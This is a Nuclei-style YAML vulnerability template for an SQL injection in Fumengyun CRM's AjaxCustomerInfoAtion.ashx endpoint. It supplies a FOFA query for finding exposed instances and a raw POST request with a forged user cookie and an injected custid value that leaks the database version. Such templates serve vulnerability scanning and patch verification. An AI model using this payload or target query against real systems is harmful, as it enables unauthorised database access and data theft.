@@ -1,0 +1,31 @@
+id: fumengyun-crm-ajaxcustomerinfoation-ashx-sql-injection
+
+info:
+  name: "孚盟云CRM AjaxCustomerInfoAtion.ashx接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+
+    该漏洞存在于孚盟云CRM系统的AjaxCustomerInfoAtion.ashx接口中，攻击者可通过构造恶意SQL语句实现数据库注入，从而获取敏感数据或控制服务器。
+  tags: 孚盟云CRM
+
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomerInfoAtion.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=getTitle&custid='-1/@@VERSION--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - 'Microsoft SQL'
+      - "nvarchar"
+    condition: and
